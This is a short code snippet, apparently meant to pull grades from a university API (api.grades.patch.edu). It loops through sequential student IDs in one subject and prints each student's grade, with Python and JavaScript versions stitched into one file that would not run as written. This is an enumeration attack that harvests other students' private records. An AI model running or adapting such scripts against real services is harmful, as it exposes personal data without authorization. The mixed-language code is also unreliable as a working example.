import axios from 'axios'
import requests, json

for id in range(1111,9999):
    response = requests.get('https://api.grades.patch.edu/grades?subjectID=1293&studentID=2022' + str(id))
    json_response = json.loads(response.text)
    print("Student: 2022" + str(id) + ", Grade: " + json_response['grade']) 

for (let id = 1111; id < 9999; id++) {
    axios
        .get('https://api.grades.patch.edu/grades?subjectid=1293&studentid=2022' + id)
        .then(res => {
            console.log("Student: 2022" + id + ", Grade: " + res.data.grade)
        })
        .catch(error => {
            console.error(error)
        }
    )
}
